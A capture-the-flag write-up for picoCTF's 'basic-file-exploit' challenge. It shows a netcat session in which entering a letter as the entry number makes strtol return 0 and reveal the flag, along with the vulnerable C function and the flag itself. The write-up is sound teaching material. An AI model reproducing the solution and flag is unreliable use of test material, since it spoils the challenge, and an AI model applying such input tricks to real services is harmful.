# basic-file-exploit
## Description
The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!
Connect to the program with netcat:  
`$ nc saturn.picoctf.net 55825`  
The program's source code with the flag redacted can be downloaded [here](program-redacted.c).
## Hints
1. Try passing in things the program doesn't expect. Like a string instead of a number.
## Solution
1. Connect to the server and pay attention to the hint.
```console
% nc saturn.picoctf.net 55825
Hi, welcome to my echo chamber!
Type '1' to enter a phrase into our database
Type '2' to echo a phrase in our database
Type '3' to exit the program
1
1
Please enter your data:
hello, world
hello, world
Please enter the length of your data:
12
12
Your entry number is: 1
Write successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
1
1
hello, world
Read successful, would you like to do anything else?
2
2
Please enter the entry number of your data:
a
a
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_68466E2F}
```
2. The `data_read` function is the key, specifically where it converts the entry number into an integer. The `strtol` function returns `0` if it can not convert, such as a letter. You could even enter `0` as an entry number and get the same result.
```c
static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, '\0', 100);
  
  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }
  
  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}
```
